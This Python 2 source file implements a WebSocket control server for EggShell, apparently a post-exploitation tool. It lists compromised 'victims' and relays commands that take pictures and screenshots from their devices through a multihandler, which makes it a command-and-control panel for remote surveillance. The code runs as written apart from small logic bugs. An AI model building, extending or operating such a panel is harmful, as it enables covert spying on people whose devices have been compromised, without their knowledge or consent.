#!/usr/bin/env python2.7
# coding:utf-8
import os
import sys
import struct
import base64
import hashlib
import socket
import threading
import json
import time
from eggshell import EggShell


class WsServer:
    def __init__(self, eggshell):
        self.host = '0.0.0.0'
        self.port = 5000
        self.buffer_size = 1024
        self.eggshell = eggshell
        self.conn_poll = []   # connection pool for server to send update info
        self.ready = False
        self.command_list = ['execution', 'fetch', 'exit']

    def recv_data(self, conn):  # 服务器解析浏览器发送的信息
        try:
            all_data = conn.recv(self.buffer_size)
            if not len(all_data):
                return False
        except:
            pass
        else:
            code_len = ord(all_data[1]) & 127
            if code_len == 126:
                masks = all_data[4:8]
                data = all_data[8:]
            elif code_len == 127:
                masks = all_data[10:14]
                data = all_data[14:]
            else:
                masks = all_data[2:6]
                data = all_data[6:]
            raw_str = ""
            i = 0
            for d in data:
                raw_str += chr(ord(d) ^ ord(masks[i % 4]))
                i += 1
            return raw_str

    def send_data(self, conn, data):  # 服务器处理发送给浏览器的信息
        if data:
            data = str(data)
        else:
            return False
        token = "\x81"
        length = len(data)
        if length < 126:
            token += struct.pack("B", length)  # struct为Python中处理二进制数的模块，二进制流为C，或网络流的形式。
        elif length <= 0xFFFF:
            token += struct.pack("!BH", 126, length)
        else:
            token += struct.pack("!BQ", 127, length)
        data = '%s%s' % (token, data)
        conn.send(data)
        return True

    def handshake(self, conn, address, thread_name):  # 握手建立连接
        headers = {}
        shake = conn.recv(1024)
        if not len(shake):
            return False

        print ('%s : Socket start handshaken with %s:%s' % (thread_name, address[0], address[1]))
        header, data = shake.split('\r\n\r\n', 1)
        for line in header.split('\r\n')[1:]:
            key, value = line.split(': ', 1)
            headers[key] = value

        if 'Sec-WebSocket-Key' not in headers:
            print ('%s : This socket is not websocket, client close.' % thread_name)
            conn.close()
            return False

        MAGIC_STRING = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
        HANDSHAKE_STRING = "HTTP/1.1 101 Switching Protocols\r\n" \
                           "Upgrade:websocket\r\n" \
                           "Connection: Upgrade\r\n" \
                           "Sec-WebSocket-Accept: {1}\r\n" \
                           "WebSocket-Origin: {2}\r\n" \
                           "WebSocket-Location: ws://{3}/\r\n\r\n"

        sec_key = headers['Sec-WebSocket-Key']
        res_key = base64.b64encode(hashlib.sha1(sec_key + MAGIC_STRING).digest())
        str_handshake = HANDSHAKE_STRING.replace('{1}', res_key)
        if 'Origin' in headers:
            str_handshake = str_handshake.replace('{2}', headers['Origin'])
        else:
            str_handshake = str_handshake.replace('{2}', "*")
        if 'Host' in headers:
            str_handshake = str_handshake.replace('{3}', headers['Host'])
        else:
            str_handshake = str_handshake.replace('{3}', "WsServer")

        conn.send(str_handshake)  # 发送建立连接的信息
        print ('%s : Socket handshaken with %s:%s success' % (thread_name, address[0], address[1]))
        print ('Start transmitting data...')
        print ('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -')
        return True

    # Handle Client Request
    def handle_request(self, conn, address, thread_name):
        self.handshake(conn, address, thread_name)  # 握手
        conn.setblocking(0)  # 设置socket为非阻塞
        self.ready = True
        self.conn_poll.append(conn)
        self.update_victim_info(conn)

        while True:
            client_data = self.recv_data(conn)
            response = {}
            if client_data:
                try:
                    raw_cmd = json.loads(client_data.decode())
                    command = raw_cmd['command']
                    if 'victims_type' in raw_cmd:
                        victims_type = raw_cmd['victims_type']
                    else:
                        victims_type = None
                    if 'content' in raw_cmd:
                        content = raw_cmd['content']
                    else:
                        content = None
                except:
                    response["status"] = "Fail"
                    response["content_type"] = "text"
                    response["content"] = "Invalid Request"
                    self.send_data(conn, json.dumps(response))
                    continue

                if command not in self.command_list:
                    response["status"] = "Fail"
                    response["content_type"] = "text"
                    response["content"] = "Invalid Command or Type"
                    self.send_data(conn, json.dumps(response))
                    continue

                if command == 'close':
                    self.close_app()
                if command == 'exit':
                    break
                elif command == 'fetch':
                    if not victims_type:
                        victims_type = 'victims'
                    if victims_type == 'victims':
                        self.update_victim_info(conn)
                    elif victims_type == 'identified victims':
                        self.update_identified_victim(conn)
                elif command == 'execution':
                    if not content:
                        response["status"] = "Fail"
                        response["content_type"] = "text"
                        response["content"] = "Invalid Action Command"
                    response = self.run_command(content)
                    self.send_data(conn, json.dumps(response))

        conn.sendall(b'End Connection')
        self.conn_poll.remove(conn)
        conn.close()


### Server Functions

    def close_app(self):
        self.close_all_connections()
        self.eggshell.server.multihandler.stop_server()

    # Close all victims' connections with server
    def close_all_connections(self):

        for conn in self.conn_poll:
            conn.sendall(b'End Connection')
            self.conn_poll.remove(conn)
            conn.close()



    # Execute command from clients' request
    def run_command(self, content):
        response = {}

        if not content:
            response["status"] = "Fail"
            response["content_type"] = "text"
            response["content"] = "Invalid Content"
            return response

        try:
            session_id = content['session_id']
            action = content['action']
            para = content['para']
        except:
            response["status"] = "Fail"
            response["content_type"] = "text"
            response["content"] = "Invalid Content Format"
            return response

        if not para:
            cmd_data = action + ' ' + para
        else:
            cmd_data = action

        if action == 'picture':
            filename = self.eggshell.server.multihandler.interact(session_id, cmd_data)
            if filename:
                response["status"] = "Success"
                response["content_type"] = "text"
                response["content"] = filename
            else:
                response["status"] = "Fail"
                response["content_type"] = "text"
                response["content"] = "Error in Execution"
        elif action == 'screenshot':
            filename = self.eggshell.server.multihandler.interact(session_id, cmd_data)
            if filename:
                response["status"] = "Success"
                response["content_type"] = "text"
                response["content"] = filename
            else:
                response["status"] = "Fail"
                response["content_type"] = "text"
                response["content"] = "Error in Execution"
        else:
            response["status"] = "Fail"
            response["content_type"] = "text"
            response["content"] = "Invalid Action"
        return response

    # Auto push victims' info when the victims' info is modified in server
    def push_data(self):
        try:
            # Send victims' info to all connections
            while True:
                if self.eggshell.server.multihandler.victims_modify:
                    for conn in self.conn_poll:
                        self.update_victim_info(conn)
                    self.eggshell.server.multihandler.victims_modify = False
                else:
                    time.sleep(3)
        except:
            print ("End connection for update error")
            return

    # Update victims' info to connection
    def update_victim_info(self, conn):
        victims = self.eggshell.server.multihandler.victims
        response = {}
        response["status"] = "Success"
        response["content_type"] = "json"
        response["content"] = victims
        self.send_data(conn, json.dumps(response))

    # Update identified victims' info to connection
    def update_identified_victim(self, conn):
        identified_victim = self.eggshell.server.multihandler.identified_victims
        response = {}
        response["status"] = "Success"
        response["content_type"] = "json"
        response["content"] = identified_victim
        self.send_data(conn, json.dumps(response))

    # WsServer Main Function, accept connections
    def ws_service(self):

        index = 1
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((self.host, self.port))
        sock.listen(10)

        print ('\r\nWebsocket server start, wait for connect!')
        print ('\r\nServer Push thread start!')
        t_push = threading.Thread(target=self.push_data)
        t_push.start()

        print ('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -')
        while True:
            try:
                connection, address = sock.accept()
                thread_name = 'thread_%s' % index
                print ('%s : Connection from %s:%s' % (thread_name, address[0], address[1]))
                t_listen = threading.Thread(target=self.handle_request, args=(connection, address, thread_name))
                t_listen.start()
                index += 1
            except KeyboardInterrupt:
                print('Close the Application')
                self.close_app()
                print('Last step to exit connection listener')
                break
            except:
                print('Error: close the Application')
                self.close_app()
                print('Last step to exit connection listener')
                break
        sys.exit()


if __name__ == "__main__":
    eggshell = EggShell()
#    eggshell.menu()
    eggshell.start_multi_handler()
    wsserver = WsServer(eggshell)
    wsserver.ws_service()
